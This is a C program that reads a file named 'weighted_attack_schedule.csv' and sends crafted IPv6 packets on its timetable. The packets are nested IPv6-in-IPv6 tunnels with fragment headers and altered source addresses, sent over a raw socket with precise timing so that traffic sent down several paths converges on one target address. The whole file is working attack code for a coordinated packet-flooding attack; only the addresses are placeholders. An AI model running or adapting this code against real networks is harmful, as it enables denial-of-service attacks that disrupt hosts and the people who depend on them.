#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <math.h>
#include <arpa/inet.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <sys/time.h>

// Placeholder addresses - Replace with your actual configuration
#define LOCAL_ADDR  "2001:db8::1"
#define TARGET_ADDR "2001:db8::2"

#define MAX_PATH_NODES 32
#define MAX_PACKET_SIZE 1500
#define INIT_RECORDS 100000  // Initial allocation of 100k records
#define GROW_FACTOR 1.5      // Memory growth factor

/* ================= Structure Definitions ================= */

struct ip6_frag_hdr {
    uint8_t  next;
    uint8_t  reserved;
    uint16_t frag_off;
    uint32_t ident;
} __attribute__((packed));

struct ip6_pseudo_hdr {
    struct in6_addr src;
    struct in6_addr dst;
    uint32_t ulpl;      /* Upper Layer Packet Length */
    uint8_t  zero[3];
    uint8_t  next_hdr;
} __attribute__((packed));

typedef struct {
    char    path_raw[256];  // Reduced buffer size
    char    nodes[MAX_PATH_NODES][INET6_ADDRSTRLEN];
    int     n_nodes;
    
    /* Scheduling and Caching Fields */
    double  send_time_s;                // Send time from CSV (relative time)
    uint8_t packet_data[MAX_PACKET_SIZE]; // Pre-built packet buffer
    int     packet_len;                 // Packet length
} record_t;

/* ================= Global Variables ================= */

static record_t *records = NULL;
static int records_capacity = 0;  // Current allocated capacity
static int records_count = 0;     // Actual loaded records
static int sent_packets = 0;

/* ================= Time Helper Functions ================= */

/* Get monotonic time (for precise scheduling, unaffected by system time changes) */
static double get_mono_time_sec() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}

/* Get real wall-clock time (Unix Epoch, for Payload writing) */
static double get_real_time_sec() {
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}

/* Precise sleep until specified time (using nanosleep) */
static void sleep_until(double target_time) {
    double now = get_mono_time_sec();
    double diff = target_time - now;
    
    if (diff <= 0) {
        return;  // Already past time
    }
    
    struct timespec req, rem;
    req.tv_sec = (time_t)diff;
    req.tv_nsec = (long)((diff - req.tv_sec) * 1e9);
    
    // Use nanosleep for precise sleeping
    while (nanosleep(&req, &rem) == -1 && errno == EINTR) {
        req = rem;
    }
}

/* ================= Checksum Calculation ================= */

static unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

static uint16_t calculate_icmpv6_checksum(struct ip6_hdr *ip, struct icmp6_hdr *icmp, int icmp_len) {
    char buf[40 + icmp_len]; 
    struct ip6_pseudo_hdr ph;

    memset(&ph, 0, sizeof(ph));
    ph.src = ip->ip6_src;
    ph.dst = ip->ip6_dst;
    ph.ulpl = htonl(icmp_len);
    ph.next_hdr = IPPROTO_ICMPV6;

    memcpy(buf, &ph, sizeof(ph));
    memcpy(buf + sizeof(ph), icmp, icmp_len);

    return checksum(buf, sizeof(ph) + icmp_len);
}

/* ================= Path Parsing ================= */

static int parse_path(const char *path_str,
                      char nodes[MAX_PATH_NODES][INET6_ADDRSTRLEN]) {
    int count = 0;
    char *path_copy = strdup(path_str);
    if (!path_copy) return 0;
    
    char *token = strtok(path_copy, "->");
    while (token && count < MAX_PATH_NODES) {
        // Trim leading/trailing spaces
        while (*token == ' ') token++;
        char *end = token + strlen(token) - 1;
        while (end > token && (*end == ' ' || *end == '\n' || *end == '\r')) {
            *end-- = 0;
        }
        
        // Validate IPv6 address format
        if (strchr(token, ':') == NULL) {
            token = strtok(NULL, "->");
            continue;
        }
        
        strncpy(nodes[count], token, INET6_ADDRSTRLEN - 1);
        nodes[count][INET6_ADDRSTRLEN - 1] = '\0';
        
        count++;
        token = strtok(NULL, "->");
    }
    
    free(path_copy);
    return count;
}

/* ================= Dynamic Array Management ================= */

static int ensure_capacity(int min_capacity) {
    if (records_capacity >= min_capacity) {
        return 0;
    }
    
    int new_capacity = records_capacity == 0 ? INIT_RECORDS : 
                      (int)(records_capacity * GROW_FACTOR);
    if (new_capacity < min_capacity) {
        new_capacity = min_capacity;
    }
    
    record_t *new_records = realloc(records, new_capacity * sizeof(record_t));
    if (!new_records) {
        fprintf(stderr, "[ERROR] Failed to reallocate memory for %d records\n", new_capacity);
        return -1;
    }
    
    records = new_records;
    records_capacity = new_capacity;
    return 0;
}

/* ================= Packet Construction ================= */

static int build_packet(uint8_t *buf,
                        char nodes[][INET6_ADDRSTRLEN],
                        int n_nodes,
                        uint32_t seq,
                        double abs_epoch_time,
                        const char *path_str) {
    uint8_t *p = buf;

    /* Payload: Record absolute timestamp (Unix Epoch) and path */
    char payload_data[512];
    int payload_len = snprintf(payload_data, sizeof(payload_data), 
                               "SEQ:%u|TS:%.6f|PATH:%s", 
                               seq, abs_epoch_time, path_str);

    if (payload_len >= (int)sizeof(payload_data)) {
        payload_len = sizeof(payload_data) - 1;
    }

    /* Inner IP */
    struct ip6_hdr inner_ip;
    memset(&inner_ip, 0, sizeof(inner_ip));
    if (inet_pton(AF_INET6, TARGET_ADDR, &inner_ip.ip6_dst) != 1) {
        fprintf(stderr, "[ERROR] Invalid TARGET_ADDR\n");
        return -1;
    }

    if (n_nodes > 0) {
        if (inet_pton(AF_INET6, nodes[n_nodes - 1], &inner_ip.ip6_src) != 1) {
            fprintf(stderr, "[ERROR] Invalid last node IPv6 address\n");
            return -1;
        }
        inner_ip.ip6_src.s6_addr[15] = (inner_ip.ip6_src.s6_addr[15] + 1) % 255;
    } else {
        if (inet_pton(AF_INET6, LOCAL_ADDR, &inner_ip.ip6_src) != 1) {
            fprintf(stderr, "[ERROR] Invalid LOCAL_ADDR\n");
            return -1;
        }
    }

    inner_ip.ip6_vfc  = 6 << 4;
    inner_ip.ip6_nxt  = IPPROTO_FRAGMENT; 
    inner_ip.ip6_hlim = 64;
    int icmp_total_len = sizeof(struct icmp6_hdr) + payload_len;
    inner_ip.ip6_plen = htons(sizeof(struct ip6_frag_hdr) + icmp_total_len);

    /* ICMPv6 */
    uint8_t icmp_full_packet[sizeof(struct icmp6_hdr) + 512];
    struct icmp6_hdr *icmp_hdr = (struct icmp6_hdr *)icmp_full_packet;
    memset(icmp_hdr, 0, sizeof(struct icmp6_hdr));
    icmp_hdr->icmp6_type  = ICMP6_ECHO_REQUEST;
    icmp_hdr->icmp6_code  = 0;
    icmp_hdr->icmp6_id    = htons(0x4242);
    icmp_hdr->icmp6_seq   = htons(seq & 0xffff);
    memcpy(icmp_full_packet + sizeof(struct icmp6_hdr), payload_data, payload_len);
    icmp_hdr->icmp6_cksum = calculate_icmpv6_checksum(&inner_ip, icmp_hdr, icmp_total_len);

    /* Inner Fragment */
    struct ip6_frag_hdr inner_frag;
    memset(&inner_frag, 0, sizeof(inner_frag));
    inner_frag.next     = IPPROTO_ICMPV6;
    inner_frag.ident    = htonl(seq);

    /* Copy to buffer */
    memcpy(p, &inner_ip,   sizeof(inner_ip));   p += sizeof(inner_ip);
    memcpy(p, &inner_frag, sizeof(inner_frag)); p += sizeof(inner_frag);
    memcpy(p, icmp_full_packet, icmp_total_len); p += icmp_total_len;

    size_t payload_len_total = sizeof(inner_ip) + sizeof(inner_frag) + icmp_total_len;

    /* Encapsulation Layers */
    for (int i = n_nodes - 1; i >= 0; i--) {
        if (payload_len_total + sizeof(struct ip6_hdr) + sizeof(struct ip6_frag_hdr) > MAX_PACKET_SIZE) {
            fprintf(stderr, "[ERROR] Packet too large for node %d\n", i);
            return -1;
        }

        if (i > 0) {
            struct ip6_frag_hdr frag;
            memset(&frag, 0, sizeof(frag));
            frag.next     = IPPROTO_IPV6;
            frag.ident    = htonl(seq + i);

            memmove(buf + sizeof(struct ip6_hdr) + sizeof(frag), buf, payload_len_total);
            memcpy(buf + sizeof(struct ip6_hdr), &frag, sizeof(frag));

            struct ip6_hdr ip;
            memset(&ip, 0, sizeof(ip));
            if (inet_pton(AF_INET6, nodes[i], &ip.ip6_dst) != 1) {
                fprintf(stderr, "[ERROR] Invalid IPv6 address for node %d: %s\n", i, nodes[i]);
                return -1;
            }
            if (inet_pton(AF_INET6, nodes[i-1], &ip.ip6_src) != 1) {
                fprintf(stderr, "[ERROR] Invalid IPv6 address for node %d: %s\n", i-1, nodes[i-1]);
                return -1;
            }
            ip.ip6_src.s6_addr[15] = (ip.ip6_src.s6_addr[15] + 1) % 255;
            ip.ip6_vfc = 6 << 4;
            ip.ip6_nxt = IPPROTO_FRAGMENT;
            ip.ip6_hlim = 64;
            ip.ip6_plen = htons(payload_len_total + sizeof(frag));

            memcpy(buf, &ip, sizeof(ip));
            payload_len_total += sizeof(struct ip6_hdr) + sizeof(frag);
        } else {
            memmove(buf + sizeof(struct ip6_hdr), buf, payload_len_total);
            struct ip6_hdr ip;
            memset(&ip, 0, sizeof(ip));
            if (inet_pton(AF_INET6, nodes[0], &ip.ip6_dst) != 1) {
                fprintf(stderr, "[ERROR] Invalid first node IPv6 address: %s\n", nodes[0]);
                return -1;
            }
            if (inet_pton(AF_INET6, LOCAL_ADDR, &ip.ip6_src) != 1) {
                fprintf(stderr, "[ERROR] Invalid LOCAL_ADDR\n");
                return -1;
            }
            ip.ip6_vfc = 6 << 4;
            ip.ip6_nxt = IPPROTO_IPV6;
            ip.ip6_hlim = 64;
            ip.ip6_plen = htons(payload_len_total);

            memcpy(buf, &ip, sizeof(ip));
            payload_len_total += sizeof(struct ip6_hdr);
        }
    }
    return payload_len_total;
}

/* ================= CSV Loading ================= */

static int load_csv(const char *filename) {
    FILE *fp = fopen(filename, "r");
    if (!fp) {
        perror("[ERROR] fopen");
        return -1;
    }

    char line[2048];
    int line_num = 0;
    
    /* Read Header */
    if (!fgets(line, sizeof(line), fp)) {
        fprintf(stderr, "[ERROR] Empty file or error reading header\n");
        fclose(fp);
        return -1;
    }
    line_num++;

    printf("Loading CSV file: %s\n", filename);
    printf("Format expected: path,total_delay_s,send_time_s,send_slot_ms\n");

    /* Read CSV Lines */
    while (fgets(line, sizeof(line), fp)) {
        line_num++;
        
        // Remove newline
        line[strcspn(line, "\r\n")] = 0;
        
        // Skip empty lines
        if (line[0] == '\0') {
            continue;
        }

        // Ensure sufficient capacity
        if (ensure_capacity(records_count + 1) < 0) {
            fclose(fp);
            return -1;
        }

        record_t *r = &records[records_count];
        
        // Parse CSV fields
        char *saveptr = NULL;
        char *token = strtok_r(line, ",", &saveptr);
        
        if (!token) {
            fprintf(stderr, "[WARN] Line %d: Missing path field\n", line_num);
            continue;
        }
        snprintf(r->path_raw, sizeof(r->path_raw), "%s", token);

        // total_delay_s (ignored)
        token = strtok_r(NULL, ",", &saveptr);
        if (!token) {
            fprintf(stderr, "[WARN] Line %d: Missing total_delay_s field\n", line_num);
            continue;
        }

        // send_time_s (critical field)
        token = strtok_r(NULL, ",", &saveptr);
        if (!token) {
            fprintf(stderr, "[WARN] Line %d: Missing send_time_s field\n", line_num);
            continue;
        }
        r->send_time_s = atof(token);
        if (r->send_time_s < 0) {
            fprintf(stderr, "[WARN] Line %d: Negative send_time_s: %.6f\n", line_num, r->send_time_s);
            r->send_time_s = 0;
        }

        // send_slot_ms (ignored)
        token = strtok_r(NULL, ",", &saveptr);
        
        // Parse path nodes
        r->n_nodes = parse_path(r->path_raw, r->nodes);
        if (r->n_nodes <= 0) {
            fprintf(stderr, "[WARN] Line %d: No valid nodes in path: %s\n", line_num, r->path_raw);
            continue;
        }

        records_count++;
        
        // Show progress
        if (records_count % 10000 == 0) {
            printf("  Loaded %d records...\n", records_count);
        }
    }
    
    fclose(fp);
    return records_count;
}

/* ================= Main Program ================= */

int main(int argc, char **argv) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s weighted_attack_schedule.csv\n", argv[0]);
        fprintf(stderr, "CSV format: path,total_delay_s,send_time_s,send_slot_ms\n");
        return 1;
    }

    printf("=== Packet Scheduler for Large-scale Traffic ===\n");
    printf("Local Address: %s\n", LOCAL_ADDR);
    printf("Target Address: %s\n\n", TARGET_ADDR);

    /* Load CSV Data */
    int loaded = load_csv(argv[1]);
    if (loaded <= 0) {
        fprintf(stderr, "[ERROR] Failed to load CSV data\n");
        return 1;
    }

    printf("\nSuccessfully loaded %d records from CSV.\n", records_count);
    printf("Memory allocated: %.2f MB\n\n", 
           (double)(records_capacity * sizeof(record_t)) / 1024 / 1024);

    /* Get Time Base */
    double base_real_time = get_real_time_sec();
    double base_mono_time = get_mono_time_sec();
    
    printf("Base Epoch Time: %.6f\n", base_real_time);
    printf("Base Mono Time: %.6f\n", base_mono_time);
    printf("Starting packet pre-building...\n\n");

    /* Pre-build All Packets */
    int build_errors = 0;
    for (int i = 0; i < records_count; i++) {
        record_t *r = &records[i];
        
        /* Calculate "Scheduled Absolute Send Time (Epoch)" for this packet and write to Payload */
        double packet_epoch_time = base_real_time + r->send_time_s;

        r->packet_len = build_packet(r->packet_data,
                                     r->nodes,
                                     r->n_nodes,
                                     i,                // SEQ
                                     packet_epoch_time,// Payload TS (Unix Epoch)
                                     r->path_raw);
        
        if (r->packet_len < 0) {
            fprintf(stderr, "[ERROR] Failed to build packet %d (path: %s)\n", i, r->path_raw);
            build_errors++;
            r->packet_len = 0;  // Mark as invalid packet
        }
        
        // Show progress
        if ((i + 1) % 10000 == 0) {
            printf("  Built %d/%d packets...\n", i + 1, records_count);
        }
    }
    
    if (build_errors > 0) {
        fprintf(stderr, "\n[WARN] Failed to build %d packets\n", build_errors);
    }
    
    printf("\nAll packets built. Initializing socket...\n");

    /* Create Raw Socket */
    int sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[ERROR] socket");
        free(records);
        return 1;
    }

    /* Increase Send Buffer */
    int sndbuf = 16 * 1024 * 1024;  // 16MB
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
        perror("[WARN] setsockopt SO_SNDBUF");
    }

    /* Disable IP Header Inclusion (Usually not needed for RAW sockets) */
    int one = 1;
    if (setsockopt(sock, IPPROTO_IPV6, IPV6_HDRINCL, &one, sizeof(one)) < 0) {
        perror("[WARN] setsockopt IPV6_HDRINCL");
    }

    printf("Socket initialized with buffer size: %d MB\n", sndbuf / 1024 / 1024);
    printf("Starting strict schedule transmission...\n\n");

    /* Transmission Loop - Strictly follow the schedule */
    double last_print_time = get_mono_time_sec();
    int last_print_count = 0;
    
    for (int i = 0; i < records_count; i++) {
        record_t *r = &records[i];

        if (r->packet_len <= 0) {
            continue;  // Skip invalid packets
        }

        /* Precise Scheduling */
        double target_sched_time = base_mono_time + r->send_time_s;
        
        // Sleep if target time is in the future
        if (get_mono_time_sec() < target_sched_time) {
            sleep_until(target_sched_time);
        }
        
        // Double check to ensure accuracy
        while (get_mono_time_sec() < target_sched_time) {
            __asm__ __volatile__("pause" ::: "memory");
        }

        /* Prepare Destination Address */
        struct sockaddr_in6 dst;
        memset(&dst, 0, sizeof(dst));
        dst.sin6_family = AF_INET6;
        if (inet_pton(AF_INET6, r->nodes[0], &dst.sin6_addr) != 1) {
            fprintf(stderr, "[ERROR] Invalid destination address for packet %d: %s\n", 
                    i, r->nodes[0]);
            continue;
        }

        /* Send Packet */
        ssize_t sent = sendto(sock,
                             r->packet_data,
                             r->packet_len,
                             0,
                             (struct sockaddr *)&dst,
                             sizeof(dst));
        
        if (sent > 0) {
            sent_packets++;
            
            // Print rate every second
            double now = get_mono_time_sec();
            if (now - last_print_time >= 1.0) {
                int packets_sent = sent_packets - last_print_count;
                printf("Sent %d packets, rate: %d pkt/sec, total: %d/%d (%.1f%%)\n",
                       packets_sent, packets_sent, 
                       sent_packets, records_count,
                       (double)sent_packets / records_count * 100);
                last_print_time = now;
                last_print_count = sent_packets;
            }
        } else {
            if (errno == ENOBUFS) {
                // Buffer full, brief sleep
                usleep(1000);
                i--;  // Retry current packet
            } else {
                perror("[ERROR] sendto");
            }
        }
    }

    close(sock);

    /* Statistics */
    printf("\n=== TRANSMISSION COMPLETE ===\n");
    printf("Records loaded      : %d\n", records_count);
    printf("Packets built       : %d\n", records_count - build_errors);
    printf("Packets sent        : %d\n", sent_packets);
    printf("Build errors        : %d\n", build_errors);
    
    if (records_count > 0) {
        printf("Success rate        : %.2f%%\n", 
               (double)sent_packets / records_count * 100);
        
        double total_time = get_mono_time_sec() - base_mono_time;
        printf("Total time          : %.3f seconds\n", total_time);
        printf("Average rate        : %.1f packets/sec\n", 
               sent_packets / total_time);
    }

    /* Cleanup */
    free(records);
    records = NULL;

    return 0;
}